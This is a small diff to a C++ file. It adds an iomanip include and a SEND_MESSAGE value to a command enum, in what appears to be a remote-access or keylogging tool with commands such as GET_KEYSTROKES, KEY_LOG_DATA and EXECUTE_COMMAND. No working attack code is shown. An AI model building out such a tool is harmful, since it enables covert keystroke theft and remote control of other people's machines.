@@ -6,6 +6,7 @@
 #include "SystemInfo.h"
 #include "ProcessManager.h"
 
+#include <iomanip>
 #include <string>
 #include <iostream>
 #include <conio.h>
@@ -22,6 +23,7 @@ enum class CommandType : uint8_t {
     GET_KEYSTROKES = 0x04,
     LIST_PROCESSES = 0x05,
     EXECUTE_COMMAND = 0x06,
+    SEND_MESSAGE = 0x07,
     HOST_INFO_RESPONSE = 0x81,
     KEY_LOG_DATA = 0x82,
     PROCESS_LIST_RESPONSE = 0x83,
